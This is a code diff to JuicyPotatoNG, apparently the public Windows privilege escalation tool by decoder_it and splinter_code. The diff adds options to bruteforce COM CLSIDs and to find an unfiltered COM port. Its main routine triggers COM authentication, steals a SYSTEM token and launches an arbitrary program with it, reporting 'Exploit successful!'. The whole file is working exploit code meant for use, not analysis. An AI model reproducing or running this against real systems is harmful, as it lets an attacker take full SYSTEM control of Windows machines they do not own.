@@ -3,6 +3,7 @@
 #include "strsafe.h"
 #include "PotatoTrigger.h"
 #include "SSPIHooks.h"
+#include "BruteforceCLSIDs.h"
 
 HANDLE g_hEventTokenStolen;
 HANDLE g_hEventAuthTriggered;
@@ -14,12 +15,9 @@ void usage();
 void ImpersonateInteractiveSid();
 BOOL EnablePriv(HANDLE hToken, LPCTSTR priv);
 int Juicy(wchar_t* processtype, wchar_t* appname, wchar_t* cmdline, BOOL interactiveMode);
-BOOL g_TestMode = FALSE;
 
 int wmain(int argc, wchar_t** argv)
 {
-	printf("\n\n\t JuicyPotatoNG\n");
-	printf("\t by decoder_it & splinter_code\n\n");
 
 	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
 	WCHAR defaultComPort[] = L"10247";
@@ -29,6 +27,9 @@ int wmain(int argc, wchar_t** argv)
 	PWCHAR cmdline = NULL;
 	PWCHAR processtype = NULL;
 	BOOL interactiveMode = FALSE;
+	BOOL bruteforceClsids = FALSE;
+	BOOL testingClsid = FALSE;
+	BOOL seekComPort = FALSE;
 
 	int cnt = 1;
 	while ((argc > 1) && (argv[cnt][0] == '-'))
@@ -69,6 +70,18 @@ int wmain(int argc, wchar_t** argv)
 		case 'i':
 			interactiveMode = TRUE;
 			break;
+
+		case 'b':
+			bruteforceClsids = TRUE;
+			break;
+
+		case 'z':
+			testingClsid = TRUE;
+			break;
+
+		case 's':
+			seekComPort = TRUE;
+			break;
 		
 		case 'h':
 			usage();
@@ -84,13 +97,24 @@ int wmain(int argc, wchar_t** argv)
 		--argc;
 	}
 
-	if ((processtype == NULL || appname == NULL) && ! g_TestMode)
+	if (!testingClsid) {
+		printf("\n\n\t JuicyPotatoNG\n");
+		printf("\t by decoder_it & splinter_code\n\n");
+	}
+
+	if (bruteforceClsids) {
+		BruteforceAllClisds();
+		return 0;
+	}
+
+	if (!testingClsid && (processtype == NULL || appname == NULL))
 	{
 		usage();
 		exit(-1);
 	}
 
-	printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
+	if (!testingClsid) 
+		printf("[*] Testing CLSID %S - COM server port %S \n", clsidStr, comPort);
 	g_hEventAuthTriggered = CreateEvent(NULL, TRUE, FALSE, NULL);
 	g_hEventTokenStolen = CreateEvent(NULL, TRUE, FALSE, NULL);
 	g_SystemTokenStolen = FALSE;
@@ -98,20 +122,28 @@ int wmain(int argc, wchar_t** argv)
 	ImpersonateInteractiveSid();
 	PotatoTrigger(clsidStr, comPort, g_hEventAuthTriggered);
 	RevertToSelf();
-	if (WaitForSingleObject(g_hEventAuthTriggered, 100) == WAIT_TIMEOUT) {
-		printf("[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. \n");
-	}
-	else {
-		if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
-			printf("[-] Cannot capture a valid SYSTEM token, exiting... \n");
+	
+	if (!testingClsid) {
+		if (WaitForSingleObject(g_hEventAuthTriggered, 3000) == WAIT_TIMEOUT) {
+			printf("[-] The privileged process failed to communicate with our COM Server :( Try a different COM port in the -l flag. \n");
 		}
 		else {
-			if (g_SystemTokenStolen && Juicy(processtype, appname, cmdline, interactiveMode))
-				printf("[+] Exploit successful! \n");
-			else
-				printf("[-] Exploit failed! \n");
+			if (WaitForSingleObject(g_hEventTokenStolen, 3000) == WAIT_TIMEOUT && g_SystemTokenStolen) {
+				printf("[-] Cannot capture a valid SYSTEM token, exiting... \n");
+			}
+			else {
+				if (g_SystemTokenStolen && Juicy(processtype, appname, cmdline, interactiveMode))
+					printf("[+] Exploit successful! \n");
+				else
+					printf("[-] Exploit failed! \n");
+			}
 		}
 	}
+	else {
+		WaitForSingleObject(g_hEventAuthTriggered, 500);
+		WaitForSingleObject(g_hEventTokenStolen, 500);
+	}
+	
 	CloseHandle(g_hEventAuthTriggered);
 	CloseHandle(g_hEventTokenStolen);
 	CloseHandle(g_hTokenStolenPrimary);
@@ -252,8 +284,10 @@ cleanup:
 
 void usage()
 {
-	printf("\n");
+	printf("\n\n\t JuicyPotatoNG\n");
+	printf("\t by decoder_it & splinter_code\n\n");
 
+	printf("\n");
 	printf("Mandatory args: \n"
 		"-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both\n"
 		"-p <program>: program to launch\n"
@@ -265,6 +299,12 @@ void usage()
 		"-a <argument>: command line argument to pass to program (default NULL)\n"
 		"-c <CLSID>: (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
 		"-i : Interactive Console (valid only with CreateProcessAsUser)\n"
+	);
+
+	printf("\n\n");
+	printf("Additional modes: \n"
+		"-b : Bruteforce all CLSIDs. !ALERT: USE ONLY FOR TESTING. About 1000 processes will be spawned!\n"
+		"-s : Seek for a suitable COM port not filtered by the Windows firewall\n"
 	);
 
 }
